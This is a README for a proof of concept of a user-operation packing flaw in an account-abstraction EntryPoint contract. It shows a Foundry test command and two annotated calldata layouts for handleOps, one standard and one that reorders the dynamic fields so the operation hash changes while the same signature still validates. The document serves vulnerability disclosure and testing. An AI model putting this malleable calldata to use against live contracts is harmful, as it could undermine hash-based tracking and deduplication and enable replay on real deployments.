# User Operation Packing Vulnerability POC

To run the vulnerability POC, run the Foundry tests via
```bash
forge test -vvvv
```

Don't have Foundry? Install by following the steps at https://github.com/foundry-rs/foundry#installation.

Alternatively, you can view a run of the tests via [GitHub Actions CI](https://github.com/alchemyplatform/entrypoint-hash-poc/actions/runs/4482650514/jobs/7880956251).

---

Standard calldata layout:
```
                                         1fad948c                                                         // function selector
args@0x000:                              0000000000000000000000000000000000000000000000000000000000000040 // offset of ops
args@0x020:                              000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // beneficiary
args@0x040: args[0]@0x000:               0000000000000000000000000000000000000000000000000000000000000001 // length of ops
args@0x060: args[0]@0x020:               0000000000000000000000000000000000000000000000000000000000000020 // offset of ops[0]
args@0x080: args[0]@0x040: ops[0]@0x000: 000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // uo.sender
args@0x0a0: args[0]@0x060: ops[0]@0x020: 0000000000000000000000000000000000000000000000000000000000000000 // uo.nonce
args@0x0c0: args[0]@0x080: ops[0]@0x040: 0000000000000000000000000000000000000000000000000000000000000160 // offset of uo.initCode within ops[0]
args@0x0e0: args[0]@0x0a0: ops[0]@0x060: 00000000000000000000000000000000000000000000000000000000000001e0 // offset of uo.callData within ops[0]
args@0x100: args[0]@0x0c0: ops[0]@0x080: 00000000000000000000000000000000000000000000000000000000004c4b40 // uo.callGasLimit
args@0x120: args[0]@0x0e0: ops[0]@0x0a0: 000000000000000000000000000000000000000000000000000000000007a120 // uo.verificationGasLimit
args@0x140: args[0]@0x100: ops[0]@0x0c0: 000000000000000000000000000000000000000000000000000000000000000a // uo.preVerificationGas
args@0x160: args[0]@0x120: ops[0]@0x0e0: 00000000000000000000000000000000000000000000000000000002540be400 // uo.maxFeePerGas
args@0x180: args[0]@0x140: ops[0]@0x100: 000000000000000000000000000000000000000000000000000000003b9aca00 // uo.maxPriorityFeePerGas
args@0x1a0: args[0]@0x160: ops[0]@0x120: 0000000000000000000000000000000000000000000000000000000000000220 // offset of uo.paymasterAndData within ops[0]
args@0x1c0: args[0]@0x180: ops[0]@0x140: 0000000000000000000000000000000000000000000000000000000000000240 // offset of uo.signature within ops[0]
args@0x1e0: args[0]@0x1a0: ops[0]@0x160: 0000000000000000000000000000000000000000000000000000000000000058 // length of initCode
args@0x200: args[0]@0x1c0: ops[0]@0x180: 2e234dae75c793f67a35089c9d99245e1c58470b5fbfb9cf0000000000000000 // initCode
args@0x220: args[0]@0x1e0: ops[0]@0x1a0: 000000005cb738dae833ec21fe65ae1719fad8ab8ce7f23d0000000000000000 // initCode
args@0x240: args[0]@0x200: ops[0]@0x1c0: 0000000000000000000000000000000000000000000000000000000000000000 // initCode
args@0x260: args[0]@0x220: ops[0]@0x1e0: 0000000000000000000000000000000000000000000000000000000000000004 // length of callData
args@0x280: args[0]@0x240: ops[0]@0x200: affed0e000000000000000000000000000000000000000000000000000000000 // callData
args@0x2a0: args[0]@0x260: ops[0]@0x220: 0000000000000000000000000000000000000000000000000000000000000000 // length of paymasterAndData
args@0x2c0: args[0]@0x280: ops[0]@0x240: 0000000000000000000000000000000000000000000000000000000000000041 // length of signature
args@0x2e0: args[0]@0x2a0: ops[0]@0x260: d7b041797cb5bc69a7f5d2217dbc7a0907767d2dff473eb21c059ea07a35f644 // signature
args@0x300: args[0]@0x2c0: ops[0]@0x280: 394e2369ccf701ccd1c56d9f8dcfe5bf85608f88c19d30ebd864b78fa7b32da1 // signature
args@0x320: args[0]@0x2e0: ops[0]@0x2a0: 1b00000000000000000000000000000000000000000000000000000000000000 // signature
```

Non-standard (hash modifying) calldata layout:

```
                                         1fad948c                                                         // function selector
args@0x000:                              0000000000000000000000000000000000000000000000000000000000000040 // offset of ops
args@0x020:                              000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // beneficiary
args@0x040: args[0]@0x000:               0000000000000000000000000000000000000000000000000000000000000001 // length of ops
args@0x060: args[0]@0x020:               0000000000000000000000000000000000000000000000000000000000000020 // offset of ops[0]
args@0x080: args[0]@0x040: ops[0]@0x000: 000000000000000000000000308c46ef8d5dc1d454dac89f2bc7310a09a0c5db // uo.sender
args@0x0a0: args[0]@0x060: ops[0]@0x020: 0000000000000000000000000000000000000000000000000000000000000000 // uo.nonce
args@0x0c0: args[0]@0x080: ops[0]@0x040: 0000000000000000000000000000000000000000000000000000000000000240 // offset of uo.initCode within ops[0]
args@0x0e0: args[0]@0x0a0: ops[0]@0x060: 0000000000000000000000000000000000000000000000000000000000000180 // offset of uo.callData within ops[0]
args@0x100: args[0]@0x0c0: ops[0]@0x080: 00000000000000000000000000000000000000000000000000000000004c4b40 // uo.callGasLimit
args@0x120: args[0]@0x0e0: ops[0]@0x0a0: 000000000000000000000000000000000000000000000000000000000007a120 // uo.verificationGasLimit
args@0x140: args[0]@0x100: ops[0]@0x0c0: 000000000000000000000000000000000000000000000000000000000000000a // uo.preVerificationGas
args@0x160: args[0]@0x120: ops[0]@0x0e0: 00000000000000000000000000000000000000000000000000000002540be400 // uo.maxFeePerGas
args@0x180: args[0]@0x140: ops[0]@0x100: 000000000000000000000000000000000000000000000000000000003b9aca00 // uo.maxPriorityFeePerGas
args@0x1a0: args[0]@0x160: ops[0]@0x120: 0000000000000000000000000000000000000000000000000000000000000160 // offset of uo.paymasterAndData within ops[0]
args@0x1c0: args[0]@0x180: ops[0]@0x140: 00000000000000000000000000000000000000000000000000000000000001c0 // offset of uo.signature within ops[0]
args@0x1e0: args[0]@0x1a0: ops[0]@0x160: 0000000000000000000000000000000000000000000000000000000000000000 // Length of paymasterAndData
args@0x200: args[0]@0x1c0: ops[0]@0x180: 0000000000000000000000000000000000000000000000000000000000000004 // length of callData
args@0x220: args[0]@0x1e0: ops[0]@0x1a0: affed0e000000000000000000000000000000000000000000000000000000000 // callData
args@0x240: args[0]@0x200: ops[0]@0x1c0: 0000000000000000000000000000000000000000000000000000000000000041 // length of signature
args@0x260: args[0]@0x220: ops[0]@0x1e0: d7b041797cb5bc69a7f5d2217dbc7a0907767d2dff473eb21c059ea07a35f644 // signature
args@0x280: args[0]@0x240: ops[0]@0x200: 394e2369ccf701ccd1c56d9f8dcfe5bf85608f88c19d30ebd864b78fa7b32da1 // signature
args@0x2a0: args[0]@0x260: ops[0]@0x220: 1b00000000000000000000000000000000000000000000000000000000000000 // signature
args@0x2c0: args[0]@0x280: ops[0]@0x240: 0000000000000000000000000000000000000000000000000000000000000058 // length of initCode
args@0x2e0: args[0]@0x2a0: ops[0]@0x260: 2e234dae75c793f67a35089c9d99245e1c58470b5fbfb9cf0000000000000000 // initCode
args@0x300: args[0]@0x2c0: ops[0]@0x280: 000000005cb738dae833ec21fe65ae1719fad8ab8ce7f23d0000000000000000 // initCode
args@0x320: args[0]@0x2e0: ops[0]@0x2a0: 0000000000000000000000000000000000000000000000000000000000000000 // initCode
```
